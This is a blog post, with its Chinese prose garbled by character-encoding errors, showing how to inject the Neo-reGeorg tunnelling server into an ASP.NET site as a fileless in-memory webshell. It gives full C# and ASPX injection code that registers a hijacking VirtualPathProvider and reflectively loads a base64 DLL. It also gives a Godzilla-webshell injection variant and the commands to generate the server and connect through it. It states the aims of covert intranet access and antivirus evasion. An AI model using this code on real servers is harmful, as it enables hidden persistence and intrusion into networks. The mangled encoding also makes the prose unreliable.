<!doctype html><html><!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-us lang=en-us><head><meta charset=utf-8><meta name=generator content="Hugo 0.121.2"><meta name=viewport content="width=device-width,initial-scale=1"><title>å†…å­˜æ”»é˜²-å†…å­˜ç‰ˆNeo-reGeorgä»£ç† &#183; Wat4r Blog</title>
<meta name=description content><link rel=stylesheet href=/sass/water.min.css><link type=text/css rel=stylesheet href=https://wat4r.github.io/css/all.min.css><link type=text/css rel=stylesheet href=https://wat4r.github.io/css/dracula.css><link rel="shortcut icon" href=https://wat4r.github.io/images/favicon.ico></head><body><header><nav class=post-nav role=navigation><a href=/>â€¹ All Posts</a></nav></header><main class="container post-page"><article class=article><h1 class=post-title>å†…å­˜æ”»é˜²-å†…å­˜ç‰ˆNeo-reGeorgä»£ç†</h1><aside class=toc><nav id=TableOfContents><ul><li><a href=#0x00-ç®€ä»‹>0x00 ç®€ä»‹</a></li><li><a href=#0x01-å®‰è£…>0x01 å®‰è£…</a></li><li><a href=#0x02-ç”ŸæˆæœåŠ¡ç«¯>0x02 ç”ŸæˆæœåŠ¡ç«¯</a></li><li><a href=#0x03-ç¼–è¯‘ä¸ºdll>0x03 ç¼–è¯‘ä¸ºdll</a></li><li><a href=#0x04-æ³¨å…¥>0x04 æ³¨å…¥</a><ul><li><a href=#å†…å­˜é©¬>å†…å­˜é©¬</a></li><li><a href=#æ–¹å¼ä¸€-ä½¿ç”¨aspxç›´æ¥åå°„æ³¨å…¥>æ–¹å¼ä¸€ ä½¿ç”¨aspxç›´æ¥åå°„æ³¨å…¥</a></li><li><a href=#æ–¹å¼äºŒ-é€šè¿‡godzillaæ’ä»¶æ³¨å…¥>æ–¹å¼äºŒ é€šè¿‡Godzillaæ’ä»¶æ³¨å…¥</a></li></ul></li><li><a href=#0x05-è¿æ¥>0x05 è¿æ¥</a></li></ul></nav></aside><hr><h1 id=å†…å­˜æ”»é˜²-å†…å­˜ç‰ˆneo-regeorgä»£ç†>å†…å­˜æ”»é˜²-å†…å­˜ç‰ˆNeo-reGeorgä»£ç†</h1><h2 id=0x00-ç®€ä»‹>0x00 ç®€ä»‹</h2><p>â€‹ <a href=https://github.com/L-codes/Neo-reGeorg>Neo-reGeorg</a> æ˜¯ä¸€ä¸ªåŸºäºPythonå¼€å‘çš„HTTPæ­£å‘éš§é“å·¥å…·ï¼Œå®ƒæ˜¯å¯¹åŸå§‹ <a href=https://github.com/sensepost/reGeorg>reGeorg</a> å·¥å…·çš„æ”¹è¿›å’Œé‡æ„ï¼Œä¸»è¦ç”¨äºåœ¨å—é™çš„ç¯å¢ƒä¸­å»ºç«‹ä¸€ä¸ªä»ç›®æ ‡å†…ç½‘åˆ°æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨çš„éšè”½é€šé“ã€‚</p><p>â€‹ æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•ä»¥å†…å­˜é©¬ğŸçš„å½¢å¼æ³¨å…¥ Neo-reGeorg Serverç«¯åˆ°ç›®æ ‡Webç«™ç‚¹ã€‚å†…å­˜ç‰ˆçš„ Neo-reGeorg å’Œå†…å­˜é©¬å…·æœ‰ç›¸åŒçš„ä¼˜ç‚¹ï¼Œæ— éœ€æ–‡ä»¶è½åœ°ï¼Œå¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡æ€æ¯’è½¯ä»¶çš„æ£€æµ‹ï¼Œå¢å¼ºéšè”½æ€§ã€‚</p><p>â€‹ ä»¥ä¸‹å°†ä»¥ <strong>ASP.NET</strong> ç«™ç‚¹ä¸ºä¾‹ï¼Œä»‹ç»å¦‚ä½•æ³¨å…¥ <a href=https://github.com/L-codes/Neo-reGeorg>Neo-reGeorg</a> å†…å­˜é©¬ã€‚ä»¥ä¸‹æµ‹è¯•ç¯å¢ƒä¸ºï¼šPython 3.8 + Neo-reGeorg 5.2.0 + ASP.NET 4.0</p><h2 id=0x01-å®‰è£…>0x01 å®‰è£…</h2><p>â€‹ Neo-reGeorg æœåŠ¡ç«¯æ”¯æŒå¤šç§è¯­è¨€ï¼Œæœ¬äººåœ¨å…¶åŸºç¡€ä¸Šæ·»åŠ äº†C#ç‰ˆæœ¬çš„template <code>tunnel.cs</code>ï¼Œç°æ”¯æŒçš„æœåŠ¡ç«¯è¯­è¨€å¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/01/23/zleW34CdS6hNDpk.png alt=image-20240123075544296></p><p>ä¸‹è½½ Neo-reGeorg</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/L-codes/Neo-reGeorg.git
</span></span></code></pre></div><p>å®‰è£…ä¾èµ–</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pip install requests
</span></span></code></pre></div><h2 id=0x02-ç”ŸæˆæœåŠ¡ç«¯>0x02 ç”ŸæˆæœåŠ¡ç«¯</h2><p>æ ¹æ® templates ç”ŸæˆæœåŠ¡ç«¯ï¼ŒæŒ‡å®šåŠ å¯†ä¼ è¾“ä½¿ç”¨çš„çš„å¯†ç </p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python neoreg.py generate -k &lt;you_password&gt;
</span></span></code></pre></div><p><img src=https://s2.loli.net/2024/01/23/LUqabwkX2HZtPW3.png alt=image-20240123080633247></p><h2 id=0x03-ç¼–è¯‘ä¸ºdll>0x03 ç¼–è¯‘ä¸ºdll</h2><ol><li>ä½¿ç”¨IDEåˆ›å»ºC# Class Libraryé¡¹ç›®ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹ä¾èµ–<ul><li>System.Web</li></ul></li><li>æŠŠ Neo-reGeorg ç”Ÿæˆçš„tunnel.cs æ·»åŠ åˆ°é¡¹ç›®ä¸­ï¼Œæ•ˆæœå¦‚ä¸‹</li><li>ä¸ºäº†æ–¹ä¾¿åç»­åå°„è°ƒç”¨ï¼ŒæŠŠæ— å‚æ„é€ æ–¹æ³•æ”¹ä¸ªåå­—ä¸º <strong>Run</strong></li></ol><p><img src=https://s2.loli.net/2024/01/25/KOwglP6p1IosuLT.png alt=image-20240125061933061></p><ol start=3><li>ç¼–è¯‘é¡¹ç›®ï¼Œç”Ÿæˆ Neoreg.dll</li></ol><h2 id=0x04-æ³¨å…¥>0x04 æ³¨å…¥</h2><h3 id=å†…å­˜é©¬>å†…å­˜é©¬</h3><p>ASP.NET å®ç°å†…å­˜é©¬æ–¹å¼æœ‰è®¸å¤šç§ï¼ŒåŒ…æ‹¬filterå†…å­˜é©¬ã€Routeå†…å­˜é©¬ã€HttpListenerå†…å­˜é©¬ã€VirtualPath å†…å­˜é©¬ç­‰ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ <a href=https://tttang.com/user/yzddmr6>yzddmr6</a> å¸ˆå‚…çš„æ–‡ç« ã€‚ä»¥ä¸‹å°†ä»¥ VirtualPath å†…å­˜é©¬ä¸ºä¾‹ï¼Œä»‹ç»ä¸¤ç§æ³¨å…¥æ–¹å¼ï¼Œä½†æœ¬è´¨éƒ½æ˜¯é€šè¿‡åå°„æ³¨å…¥ã€‚</p><h3 id=æ–¹å¼ä¸€-ä½¿ç”¨aspxç›´æ¥åå°„æ³¨å…¥>æ–¹å¼ä¸€ ä½¿ç”¨aspxç›´æ¥åå°„æ³¨å…¥</h3><p>åå°„åŠ è½½ä»¥ä¸Šç¼–è¯‘çš„dll</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=line><span class=cl><span class=n>String</span> <span class=n>neoregLibraryBase64</span> <span class=p>=</span> <span class=s>&#34;TVqQAAMAAAAEAAAA................&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>byte</span><span class=p>[]</span> <span class=n>neoregLibrary</span> <span class=p>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>neoregLibraryBase64</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>object</span> <span class=n>neoreg</span> <span class=p>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>.</span><span class=n>Load</span><span class=p>(</span><span class=n>neoregLibrary</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>neoregInstance</span> <span class=p>=</span> <span class=p>((</span><span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>)</span><span class=n>neoreg</span><span class=p>).</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s>&#34;Neoreg.Neoreg&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥æŠŠå®ƒä¿å­˜åˆ°cacheé‡Œï¼Œé¿å…æ¯ä¸€ä¸ªè¯·æ±‚éƒ½é‡å¤è¿›è¡Œåå°„åŠ è½½</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=line><span class=cl><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>;</span>
</span></span></code></pre></div><p>è°ƒç”¨Runæ–¹æ³•</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=line><span class=cl><span class=kt>var</span> <span class=n>runMethod</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>.</span><span class=n>GetType</span><span class=p>().</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Run&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>runMethod</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span> <span class=n>runMethod</span><span class=p>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>neoregInstance</span><span class=p>,</span> <span class=kc>null</span><span class=p>);</span>
</span></span></code></pre></div><p>åŠ ä¸Šå†…å­˜é©¬éƒ¨åˆ†ï¼Œ<code>neoreg.aspx</code> å®Œæ•´å®ç°å¦‚ä¸‹ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=line><span class=cl><span class=p>&lt;%</span><span class=err>@</span> <span class=n>Page</span> <span class=n>Language</span><span class=p>=</span><span class=s>&#34;C#&#34;</span><span class=p>%&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;%</span><span class=err>@</span> <span class=n>Import</span> <span class=n>Namespace</span><span class=p>=</span><span class=s>&#34;System.Web.Hosting&#34;</span> <span class=p>%&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=n>script</span> <span class=n>runat</span><span class=p>=</span><span class=s>&#34;server&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>NeoregPathProvider</span> <span class=p>:</span> <span class=n>VirtualPathProvider</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=kd>override</span> <span class=kt>string</span> <span class=n>GetCacheKey</span><span class=p>(</span><span class=kt>string</span> <span class=n>virtualPath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>neoregLibraryBase64</span> <span class=p>=</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;TVqQAAMAAAAEAAAA//8AAL.......................&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span> <span class=n>context</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>String</span> <span class=n>type</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>Params</span><span class=p>[</span><span class=s>&#34;proxy&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>type</span> <span class=p>==</span> <span class=s>&#34;neoreg&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>Object</span> <span class=n>neoregInstance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=kt>byte</span><span class=p>[]</span> <span class=n>neoregLibrary</span> <span class=p>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>neoregLibraryBase64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>]</span> <span class=p>==</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>object</span> <span class=n>neoreg</span> <span class=p>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>.</span><span class=n>Load</span><span class=p>(</span><span class=n>neoregLibrary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=n>neoregInstance</span> <span class=p>=</span> <span class=p>((</span><span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>)</span><span class=n>neoreg</span><span class=p>).</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s>&#34;Neoreg.Neoreg&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>neoregInstance</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>neoregInstance</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>var</span> <span class=n>runMethod</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>.</span><span class=n>GetType</span><span class=p>().</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Run&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=n>runMethod</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span> <span class=n>runMethod</span><span class=p>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>neoregInstance</span><span class=p>,</span> <span class=kc>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>e</span><span class=p>.</span><span class=n>Message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Previous</span><span class=p>.</span><span class=n>GetCacheKey</span><span class=p>(</span><span class=n>virtualPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=n>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;%</span>
</span></span><span class=line><span class=cl>    <span class=kt>string</span> <span class=n>msg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>NeoregPathProvider</span> <span class=n>neoregProvider</span> <span class=p>=</span> <span class=k>new</span> <span class=n>NeoregPathProvider</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>HostingEnvironment</span><span class=p>.</span><span class=n>RegisterVirtualPathProvider</span><span class=p>(</span><span class=n>neoregProvider</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>neoregProvider</span><span class=p>.</span><span class=n>InitializeLifetimeService</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=p>=</span> <span class=s>&#34;Inject success!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=p>=</span> <span class=s>&#34;Inject error: &#34;</span> <span class=p>+</span> <span class=n>error</span><span class=p>.</span><span class=n>Message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>Context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>%&gt;</span>
</span></span></code></pre></div><p>è®¿é—® <code>neoreg.aspx</code> è¿›è¡Œæ³¨å…¥</p><p><img src=https://s2.loli.net/2024/01/25/xpVyZAX8sDLR6bg.png alt=image-20240125064222689></p><h3 id=æ–¹å¼äºŒ-é€šè¿‡godzillaæ’ä»¶æ³¨å…¥>æ–¹å¼äºŒ é€šè¿‡Godzillaæ’ä»¶æ³¨å…¥</h3><p>â€‹ å€ŸåŠ© Godzilla çš„C#ç¨‹åºé›†åŠ è½½æ’ä»¶ <a href=https://github.com/wat4r/GodzillaAssemblyLoadPlugin>GodzillaAssemblyLoadPlugin</a>ï¼Œå¯ä»¥é€šè¿‡Godzillaçš„aspx Webshellç›´æ¥ä»å†…å­˜æ‰§è¡Œæ³¨å…¥æ“ä½œï¼Œæ— æ–‡ä»¶è½åœ°ï¼Œå…·ä½“å®ç°è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>ä½¿ç”¨ IDE å†æ–°å»ºä¸€ä¸ª C# Class Libraryé¡¹ç›®ï¼Œå¹¶æ·»åŠ  System.Web ä¾èµ–</p></li><li><p>å…·ä½“å®ç°ä»£ç å’Œ<a href=#aaa8>æ–¹å¼ä¸€</a>å·®ä¸å¤šï¼Œå°†å…¶ç¼–è¯‘ä¸ºdllï¼Œå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=line><span class=cl><span class=k>using</span> <span class=nn>System</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Web.Hosting</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nn>GodzillaNeoreg</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>NeoregPathProvider</span> <span class=p>:</span> <span class=n>VirtualPathProvider</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=kd>override</span> <span class=kt>string</span> <span class=n>GetCacheKey</span><span class=p>(</span><span class=kt>string</span> <span class=n>virtualPath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>neoregLibraryBase64</span> <span class=p>=</span> <span class=s>&#34;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAA.....&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span> <span class=n>context</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>String</span> <span class=n>type</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>Params</span><span class=p>[</span><span class=s>&#34;proxy&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>type</span> <span class=p>==</span> <span class=s>&#34;neoreg&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>Object</span> <span class=n>neoregInstance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=kt>byte</span><span class=p>[]</span> <span class=n>neoregLibrary</span> <span class=p>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>neoregLibraryBase64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>]</span> <span class=p>==</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>object</span> <span class=n>neoreg</span> <span class=p>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>.</span><span class=n>Load</span><span class=p>(</span><span class=n>neoregLibrary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=n>neoregInstance</span> <span class=p>=</span> <span class=p>((</span><span class=n>System</span><span class=p>.</span><span class=n>Reflection</span><span class=p>.</span><span class=n>Assembly</span><span class=p>)</span><span class=n>neoreg</span><span class=p>).</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s>&#34;Neoreg.Neoreg&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=k>else</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>neoregInstance</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Cache</span><span class=p>[</span><span class=s>&#34;neoreg&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>neoregInstance</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>var</span> <span class=n>runMethod</span> <span class=p>=</span> <span class=n>neoregInstance</span><span class=p>.</span><span class=n>GetType</span><span class=p>().</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Run&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=n>runMethod</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span> <span class=n>runMethod</span><span class=p>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>neoregInstance</span><span class=p>,</span> <span class=kc>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>e</span><span class=p>.</span><span class=n>Message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Previous</span><span class=p>.</span><span class=n>GetCacheKey</span><span class=p>(</span><span class=n>virtualPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>NeoregInject</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>NeoregInject</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kt>string</span> <span class=n>msg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>NeoregPathProvider</span> <span class=n>neoregProvider</span> <span class=p>=</span> <span class=k>new</span> <span class=n>NeoregPathProvider</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>HostingEnvironment</span><span class=p>.</span><span class=n>RegisterVirtualPathProvider</span><span class=p>(</span><span class=n>neoregProvider</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>neoregProvider</span><span class=p>.</span><span class=n>InitializeLifetimeService</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>msg</span> <span class=p>=</span> <span class=s>&#34;Inject success!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>msg</span> <span class=p>=</span> <span class=s>&#34;Inject error: &#34;</span> <span class=p>+</span> <span class=n>error</span><span class=p>.</span><span class=n>Message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>End</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=3><li><p>åœ¨ Godzilla å®‰è£… <a href=https://github.com/wat4r/GodzillaAssemblyLoadPlugin>GodzillaAssemblyLoadPlugin</a> æ’ä»¶å¹¶è¿ä¸Šç›®æ ‡aspx webshell</p></li><li><p>åœ¨GodzillaAssemblyLoadPluginä¸­é€‰æ‹©ç¼–è¯‘å¥½çš„dllï¼Œè¾“å…¥dllé‡Œå¯¹åº”çš„instanceï¼š<code>GodzillaNeoreg.NeoregInject</code>ï¼Œç„¶åç‚¹å‡»Run</p></li></ol><p><img src=https://s2.loli.net/2024/01/25/xw8YbqFL24Z9DSV.png alt=image-20240125082045391></p><h2 id=0x05-è¿æ¥>0x05 è¿æ¥</h2><p>ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python neoreg.py -u http://localhost:5000/?proxy<span class=o>=</span>neoreg -k P@ssw0rd -vv
